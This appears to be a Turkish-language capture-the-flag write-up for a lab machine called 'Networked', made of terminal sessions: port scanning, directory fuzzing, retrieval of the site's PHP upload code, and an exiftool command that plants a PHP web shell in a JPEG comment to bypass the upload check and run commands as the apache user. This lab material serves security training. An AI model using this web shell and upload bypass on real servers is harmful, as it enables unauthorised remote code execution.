@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Networked</title><link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul><li><a href="/">Index of /Team Red Blue</a></li></ul>
+  </div>
+</header>
+<main>
+      <hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nmap <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> <span class="nt">-A</span> <span class="nt">-O</span> 10.10.10.146
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-11-14 15:05 +03
+Nmap scan report <span class="k">for </span>10.10.10.146
+Host is up <span class="o">(</span>0.065s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65532 filtered ports
+PORT    STATE  SERVICE VERSION
+22/tcp  open   ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b <span class="o">(</span>RSA<span class="o">)</span>
+|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open   http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.4.16<span class="o">)</span>
+|_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16
+|_http-title: Site doesnt have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span><span class="nb">.</span>
+443/tcp closed https
+Aggressive OS guesses: Linux 3.10 - 4.11 <span class="o">(</span>94%<span class="o">)</span>, Linux 3.2 - 4.9 <span class="o">(</span>91%<span class="o">)</span>, Linux 3.13 or 4.2 <span class="o">(</span>90%<span class="o">)</span>, Linux 4.10 <span class="o">(</span>90%<span class="o">)</span>, Linux 4.2 <span class="o">(</span>90%<span class="o">)</span>, Linux 4.4 <span class="o">(</span>90%<span class="o">)</span>, Asus RT-AC66U WAP <span class="o">(</span>90%<span class="o">)</span>, Linux 3.11 - 3.12 <span class="o">(</span>90%<span class="o">)</span>, Linux 3.2 <span class="o">(</span>90%<span class="o">)</span>, Linux 4.1 <span class="o">(</span>90%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+Network Distance: 2 hops
+
+TRACEROUTE <span class="o">(</span>using port 443/tcp<span class="o">)</span>
+HOP RTT      ADDRESS
+1   65.26 ms 10.10.14.1
+2   65.31 ms 10.10.10.146
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>157.65 seconds
+</code></pre></div></div>
+<hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ curl <span class="nt">-s</span> <span class="nt">-XGET</span> 10.10.10.146
+&lt;html&gt;
+&lt;body&gt;
+Hello mate, were building the new FaceMash!&lt;/br&gt;
+Help by funding us and be the new Tyler&amp;Cameron!&lt;/br&gt;
+Join us at the pool party this Sat to get a glimpse
+&lt;<span class="o">!</span><span class="nt">--</span> upload and gallery not yet linked <span class="nt">--</span><span class="o">&gt;</span>
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ wfuzz <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt <span class="nt">-u</span> http://10.10.10.146/FUZZ <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-c</span> 
+
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 2.4 - The Web Fuzzer                           <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://10.10.10.146/FUZZ
+Total requests: 207643
+
+<span class="o">===================================================================</span>
+ID           Response   Lines    Word     Chars       Payload                                                                                                       
+<span class="o">===================================================================</span>
+
+000000164:   301        7 L      20 W     236 Ch      <span class="s2">"uploads"</span>                                                                                                                                                                                                              
+000001527:   301        7 L      20 W     235 Ch      <span class="s2">"backup"</span>
+</code></pre></div></div>
+<hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ curl <span class="nt">-XGET</span> 10.10.10.146/backup/
+&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//W3C//DTD HTML 3.2 Final//EN"</span><span class="o">&gt;</span>
+&lt;html&gt;
+ &lt;<span class="nb">head</span><span class="o">&gt;</span>
+  &lt;title&gt;Index of /backup&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+&lt;h1&gt;Index of /backup&lt;/h1&gt;
+  &lt;table&gt;
+   &lt;<span class="nb">tr</span><span class="o">&gt;</span>&lt;th <span class="nv">valign</span><span class="o">=</span><span class="s2">"top"</span><span class="o">&gt;</span>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">"/icons/blank.gif"</span> <span class="nv">alt</span><span class="o">=</span><span class="s2">"[ICO]"</span><span class="o">&gt;</span>&lt;/th&gt;&lt;th&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"?C=N;O=D"</span><span class="o">&gt;</span>Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"?C=M;O=A"</span><span class="o">&gt;</span>Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"?C=S;O=A"</span><span class="o">&gt;</span>Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"?C=D;O=A"</span><span class="o">&gt;</span>Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;
+   &lt;<span class="nb">tr</span><span class="o">&gt;</span>&lt;th <span class="nv">colspan</span><span class="o">=</span><span class="s2">"5"</span><span class="o">&gt;</span>&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;<span class="nb">tr</span><span class="o">&gt;</span>&lt;td <span class="nv">valign</span><span class="o">=</span><span class="s2">"top"</span><span class="o">&gt;</span>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">"/icons/back.gif"</span> <span class="nv">alt</span><span class="o">=</span><span class="s2">"[PARENTDIR]"</span><span class="o">&gt;</span>&lt;/td&gt;&lt;td&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"/"</span><span class="o">&gt;</span>Parent Directory&lt;/a&gt;       &lt;/td&gt;&lt;td&gt;&amp;nbsp<span class="p">;</span>&lt;/td&gt;&lt;td <span class="nv">align</span><span class="o">=</span><span class="s2">"right"</span><span class="o">&gt;</span>  - &lt;/td&gt;&lt;td&gt;&amp;nbsp<span class="p">;</span>&lt;/td&gt;&lt;/tr&gt;
+&lt;<span class="nb">tr</span><span class="o">&gt;</span>&lt;td <span class="nv">valign</span><span class="o">=</span><span class="s2">"top"</span><span class="o">&gt;</span>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">"/icons/tar.gif"</span> <span class="nv">alt</span><span class="o">=</span><span class="s2">"[   ]"</span><span class="o">&gt;</span>&lt;/td&gt;&lt;td&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"backup.tar"</span><span class="o">&gt;</span>backup.tar&lt;/a&gt;             &lt;/td&gt;&lt;td <span class="nv">align</span><span class="o">=</span><span class="s2">"right"</span><span class="o">&gt;</span>2019-07-09 13:33  &lt;/td&gt;&lt;td <span class="nv">align</span><span class="o">=</span><span class="s2">"right"</span><span class="o">&gt;</span> 10K&lt;/td&gt;&lt;td&gt;&amp;nbsp<span class="p">;</span>&lt;/td&gt;&lt;/tr&gt;
+   &lt;<span class="nb">tr</span><span class="o">&gt;</span>&lt;th <span class="nv">colspan</span><span class="o">=</span><span class="s2">"5"</span><span class="o">&gt;</span>&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre></div></div>
+<hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ curl <span class="nt">-s</span> <span class="nt">-XGET</span> 10.10.10.146/backup/backup.tar <span class="nt">--output</span> backup.tar
+➜  ~ file backup.tar 
+backup.tar: POSIX <span class="nb">tar </span>archive <span class="o">(</span>GNU<span class="o">)</span>
+</code></pre></div></div>
+<hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ <span class="nb">mkdir </span>backup
+➜  ~ <span class="nb">mv </span>backup.tar backup
+➜  ~ <span class="nb">cd </span>backup 
+➜  backup <span class="nb">ls
+</span>backup.tar
+➜  backup <span class="nb">tar</span> <span class="nt">-vxf</span> backup.tar  
+index.php
+lib.php
+photos.php
+upload.php 
+</code></pre></div></div>
+<hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  backup curl <span class="nt">-XGET</span> 10.10.10.146/photos.php
+&lt;html&gt;
+&lt;<span class="nb">head</span><span class="o">&gt;</span>
+&lt;style <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span><span class="o">&gt;</span>
+.tg  <span class="o">{</span>border-collapse:collapse<span class="p">;</span>border-spacing:0<span class="p">;</span>margin:0px auto<span class="p">;</span><span class="o">}</span>
+.tg td<span class="o">{</span>font-family:Arial, sans-serif<span class="p">;</span>font-size:14px<span class="p">;</span>padding:10px 5px<span class="p">;</span>border-style:solid<span class="p">;</span>border-width:1px<span class="p">;</span>overflow:hidden<span class="p">;</span>word-break:normal<span class="p">;</span>border-color:black<span class="p">;</span><span class="o">}</span>
+.tg th<span class="o">{</span>font-family:Arial, sans-serif<span class="p">;</span>font-size:14px<span class="p">;</span>font-weight:normal<span class="p">;</span>padding:10px 5px<span class="p">;</span>border-style:solid<span class="p">;</span>border-width:1px<span class="p">;</span>overflow:hidden<span class="p">;</span>word-break:normal<span class="p">;</span>border-color:black<span class="p">;</span><span class="o">}</span>
+.tg .tg-0lax<span class="o">{</span>text-align:left<span class="p">;</span>vertical-align:top<span class="o">}</span>
+@media screen and <span class="o">(</span>max-width: 767px<span class="o">)</span> <span class="o">{</span>.tg <span class="o">{</span>width: auto <span class="o">!</span>important<span class="p">;</span><span class="o">}</span>.tg col <span class="o">{</span>width: auto <span class="o">!</span>important<span class="p">;</span><span class="o">}</span>.tg-wrap <span class="o">{</span>overflow-x: auto<span class="p">;</span><span class="nt">-webkit-overflow-scrolling</span>: <span class="nb">touch</span><span class="p">;</span>margin: auto 0px<span class="p">;</span><span class="o">}}</span>&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+Welcome to our awesome gallery!&lt;/br&gt;
+See recent uploaded pictures from our community, and feel free to rate or comment&lt;/br&gt;
+&lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"tg-wrap"</span><span class="o">&gt;</span>&lt;table <span class="nv">class</span><span class="o">=</span><span class="s2">"tg"</span><span class="o">&gt;</span>
+&lt;<span class="nb">tr</span><span class="o">&gt;</span>
+&lt;td <span class="nv">class</span><span class="o">=</span><span class="s2">"tg-0lax"</span><span class="o">&gt;</span>uploaded by 127_0_0_4.png&lt;br&gt;&lt;img <span class="nv">src</span><span class="o">=</span><span class="s1">'uploads/127_0_0_4.png'</span> <span class="nv">width</span><span class="o">=</span>100px&gt;&lt;/td&gt;
+&lt;td <span class="nv">class</span><span class="o">=</span><span class="s2">"tg-0lax"</span><span class="o">&gt;</span>uploaded by 127_0_0_3.png&lt;br&gt;&lt;img <span class="nv">src</span><span class="o">=</span><span class="s1">'uploads/127_0_0_3.png'</span> <span class="nv">width</span><span class="o">=</span>100px&gt;&lt;/td&gt;
+&lt;td <span class="nv">class</span><span class="o">=</span><span class="s2">"tg-0lax"</span><span class="o">&gt;</span>uploaded by 127_0_0_2.png&lt;br&gt;&lt;img <span class="nv">src</span><span class="o">=</span><span class="s1">'uploads/127_0_0_2.png'</span> <span class="nv">width</span><span class="o">=</span>100px&gt;&lt;/td&gt;
+&lt;td <span class="nv">class</span><span class="o">=</span><span class="s2">"tg-0lax"</span><span class="o">&gt;</span>uploaded by 127_0_0_1.png&lt;br&gt;&lt;img <span class="nv">src</span><span class="o">=</span><span class="s1">'uploads/127_0_0_1.png'</span> <span class="nv">width</span><span class="o">=</span>100px&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/table&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+<hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  backup curl <span class="nt">-XGET</span> 10.10.10.146/upload.php
+&lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">"/upload.php"</span> <span class="nv">method</span><span class="o">=</span><span class="s2">"post"</span> <span class="nv">enctype</span><span class="o">=</span><span class="s2">"multipart/form-data"</span><span class="o">&gt;</span>
+ &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"file"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"myFile"</span><span class="o">&gt;</span>
+ &lt;br&gt;
+&lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"go!"</span><span class="o">&gt;</span>
+&lt;/form&gt;
+</code></pre></div></div>
+<hr />
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  backup cat lib.php 
+<span class="cp">&lt;?php</span>
+
+<span class="k">function</span> <span class="nf">getnameCheck</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nv">$pieces</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$filename</span><span class="p">);</span>
+  <span class="nv">$name</span><span class="o">=</span> <span class="nb">array_shift</span><span class="p">(</span><span class="nv">$pieces</span><span class="p">);</span>
+  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'_'</span><span class="p">,</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$name</span><span class="p">);</span>
+  <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$pieces</span><span class="p">);</span>
+  <span class="c1">#echo "name $name - ext $ext\n";</span>
+  <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$ext</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">getnameUpload</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nv">$pieces</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$filename</span><span class="p">);</span>
+  <span class="nv">$name</span><span class="o">=</span> <span class="nb">array_shift</span><span class="p">(</span><span class="nv">$pieces</span><span class="p">);</span>
+  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'_'</span><span class="p">,</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$name</span><span class="p">);</span>
+  <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$pieces</span><span class="p">);</span>
+  <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$ext</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">check_ip</span><span class="p">(</span><span class="nv">$prefix</span><span class="p">,</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">//echo "prefix: $prefix - fname: $filename&lt;br&gt;\n";</span>
+  <span class="nv">$ret</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$prefix</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_IP</span><span class="p">)))</span> <span class="p">{</span>
+    <span class="nv">$ret</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">"4tt4ck on file "</span><span class="o">.</span><span class="nv">$filename</span><span class="o">.</span><span class="s2">": prefix is not a valid ip "</span><span class="p">;</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$msg</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="nv">$msg</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">file_mime_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nv">$regexp</span> <span class="o">=</span> <span class="s1">'/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/'</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'finfo_file'</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nv">$finfo</span> <span class="o">=</span> <span class="nb">finfo_open</span><span class="p">(</span><span class="nx">FILEINFO_MIME</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">))</span> <span class="c1">// It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system</span>
+    <span class="p">{</span>
+      <span class="nv">$mime</span> <span class="o">=</span> <span class="o">@</span><span class="nb">finfo_file</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">,</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">'tmp_name'</span><span class="p">]);</span>
+      <span class="nb">finfo_close</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$mime</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">preg_match</span><span class="p">(</span><span class="nv">$regexp</span><span class="p">,</span> <span class="nv">$mime</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nv">$file_type</span> <span class="o">=</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+        <span class="k">return</span> <span class="nv">$file_type</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'mime_content_type'</span><span class="p">))</span>
+  <span class="p">{</span>
+    <span class="nv">$file_type</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mime_content_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">'tmp_name'</span><span class="p">]);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$file_type</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">// It's possible that mime_content_type() returns FALSE or an empty string</span>
+    <span class="p">{</span>
+      <span class="k">return</span> <span class="nv">$file_type</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">'type'</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">check_file_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nv">$mime_type</span> <span class="o">=</span> <span class="nx">file_mime_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$mime_type</span><span class="p">,</span> <span class="s1">'image/'</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+  <span class="p">}</span>  
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">displayform</span><span class="p">()</span> <span class="p">{</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_SELF'</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="s">"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
+ <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"myFile"</span><span class="nt">&gt;</span>
+ <span class="nt">&lt;br&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"go!"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="cp">&lt;?php</span>
+  <span class="k">exit</span><span class="p">();</span>
+<span class="p">}</span>
+
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<hr />
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  backup exiftool -Comment='<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>' malicious.jpeg 
+1 image files updated
+➜  backup mv malicious.jpeg malicious.php.jpeg
+</code></pre></div></div>
+<h4 id="libphp-dosyasındaki-kontrol-doğru-sağlanmadığı-için-dosya-formatı-değiştirilerek-basitçe-bypass-edilebilir">lib.php dosyasındaki kontrol doğru sağlanmadığı için, dosya formatı değiştirilerek basitçe bypass edilebilir.</h4>
+
+<hr />
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  backup curl -s -XGET 10.10.10.146/photos.php
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;</span>
+<span class="nc">.tg</span>  <span class="p">{</span><span class="nl">border-collapse</span><span class="p">:</span><span class="nb">collapse</span><span class="p">;</span><span class="nl">border-spacing</span><span class="p">:</span><span class="m">0</span><span class="p">;</span><span class="nl">margin</span><span class="p">:</span><span class="m">0px</span> <span class="nb">auto</span><span class="p">;}</span>
+<span class="nc">.tg</span> <span class="nt">td</span><span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Arial</span><span class="p">,</span> <span class="nb">sans-serif</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">14px</span><span class="p">;</span><span class="nl">padding</span><span class="p">:</span><span class="m">10px</span> <span class="m">5px</span><span class="p">;</span><span class="nl">border-style</span><span class="p">:</span><span class="nb">solid</span><span class="p">;</span><span class="nl">border-width</span><span class="p">:</span><span class="m">1px</span><span class="p">;</span><span class="nl">overflow</span><span class="p">:</span><span class="nb">hidden</span><span class="p">;</span><span class="nl">word-break</span><span class="p">:</span><span class="nb">normal</span><span class="p">;</span><span class="nl">border-color</span><span class="p">:</span><span class="no">black</span><span class="p">;}</span>
+<span class="nc">.tg</span> <span class="nt">th</span><span class="p">{</span><span class="nl">font-family</span><span class="p">:</span><span class="n">Arial</span><span class="p">,</span> <span class="nb">sans-serif</span><span class="p">;</span><span class="nl">font-size</span><span class="p">:</span><span class="m">14px</span><span class="p">;</span><span class="nl">font-weight</span><span class="p">:</span><span class="nb">normal</span><span class="p">;</span><span class="nl">padding</span><span class="p">:</span><span class="m">10px</span> <span class="m">5px</span><span class="p">;</span><span class="nl">border-style</span><span class="p">:</span><span class="nb">solid</span><span class="p">;</span><span class="nl">border-width</span><span class="p">:</span><span class="m">1px</span><span class="p">;</span><span class="nl">overflow</span><span class="p">:</span><span class="nb">hidden</span><span class="p">;</span><span class="nl">word-break</span><span class="p">:</span><span class="nb">normal</span><span class="p">;</span><span class="nl">border-color</span><span class="p">:</span><span class="no">black</span><span class="p">;}</span>
+<span class="nc">.tg</span> <span class="nc">.tg-0lax</span><span class="p">{</span><span class="nl">text-align</span><span class="p">:</span><span class="nb">left</span><span class="p">;</span><span class="nl">vertical-align</span><span class="p">:</span><span class="nb">top</span><span class="p">}</span>
+<span class="k">@media</span> <span class="n">screen</span> <span class="n">and</span> <span class="p">(</span><span class="n">max-width</span><span class="p">:</span> <span class="m">767px</span><span class="p">)</span> <span class="p">{</span><span class="nc">.tg</span> <span class="p">{</span><span class="nl">width</span><span class="p">:</span> <span class="nb">auto</span> <span class="cp">!important</span><span class="p">;}</span><span class="nc">.tg</span> <span class="nt">col</span> <span class="p">{</span><span class="nl">width</span><span class="p">:</span> <span class="nb">auto</span> <span class="cp">!important</span><span class="p">;}</span><span class="nc">.tg-wrap</span> <span class="p">{</span><span class="nl">overflow-x</span><span class="p">:</span> <span class="nb">auto</span><span class="p">;</span><span class="nl">-webkit-overflow-scrolling</span><span class="p">:</span> <span class="n">touch</span><span class="p">;</span><span class="nl">margin</span><span class="p">:</span> <span class="nb">auto</span> <span class="m">0px</span><span class="p">;}}</span><span class="nt">&lt;/style&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+Welcome to our awesome gallery!<span class="nt">&lt;/br&gt;</span>
+See recent uploaded pictures from our community, and feel free to rate or comment<span class="nt">&lt;/br&gt;</span>
+<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"tg-wrap"</span><span class="nt">&gt;&lt;table</span> <span class="na">class=</span><span class="s">"tg"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;tr&gt;</span>
+<span class="nt">&lt;td</span> <span class="na">class=</span><span class="s">"tg-0lax"</span><span class="nt">&gt;</span>uploaded by 10_10_14_12.php.jpeg<span class="nt">&lt;br&gt;&lt;img</span> <span class="na">src=</span><span class="s">'uploads/10_10_14_12.php.jpeg'</span> <span class="na">width=</span><span class="s">100px</span><span class="nt">&gt;&lt;/td&gt;</span>
+<span class="nt">&lt;td</span> <span class="na">class=</span><span class="s">"tg-0lax"</span><span class="nt">&gt;</span>uploaded by 127_0_0_4.png<span class="nt">&lt;br&gt;&lt;img</span> <span class="na">src=</span><span class="s">'uploads/127_0_0_4.png'</span> <span class="na">width=</span><span class="s">100px</span><span class="nt">&gt;&lt;/td&gt;</span>
+<span class="nt">&lt;td</span> <span class="na">class=</span><span class="s">"tg-0lax"</span><span class="nt">&gt;</span>uploaded by 127_0_0_3.png<span class="nt">&lt;br&gt;&lt;img</span> <span class="na">src=</span><span class="s">'uploads/127_0_0_3.png'</span> <span class="na">width=</span><span class="s">100px</span><span class="nt">&gt;&lt;/td&gt;</span>
+<span class="nt">&lt;td</span> <span class="na">class=</span><span class="s">"tg-0lax"</span><span class="nt">&gt;</span>uploaded by 127_0_0_2.png<span class="nt">&lt;br&gt;&lt;img</span> <span class="na">src=</span><span class="s">'uploads/127_0_0_2.png'</span> <span class="na">width=</span><span class="s">100px</span><span class="nt">&gt;&lt;/td&gt;</span>
+<span class="nt">&lt;/tr&gt;</span>
+<span class="nt">&lt;tr&gt;</span>
+<span class="nt">&lt;td</span> <span class="na">class=</span><span class="s">"tg-0lax"</span><span class="nt">&gt;</span>uploaded by 127_0_0_1.png<span class="nt">&lt;br&gt;&lt;img</span> <span class="na">src=</span><span class="s">'uploads/127_0_0_1.png'</span> <span class="na">width=</span><span class="s">100px</span><span class="nt">&gt;&lt;/td&gt;</span>
+<span class="nt">&lt;/tr&gt;</span>
+<span class="nt">&lt;/table&gt;&lt;/div&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+<hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  backup  curl <span class="nt">-s</span> <span class="nt">-XGET</span> <span class="nt">--url</span> <span class="s2">"http://10.10.10.146/uploads/10_10_14_12.php.jpeg?cmd=id"</span> <span class="nt">--output</span> payload<span class="p">;</span> <span class="nb">cat </span>payload
+ÿØÿàJFIFÿþ,&lt;pre&gt;uid<span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span>
+ÿÛ
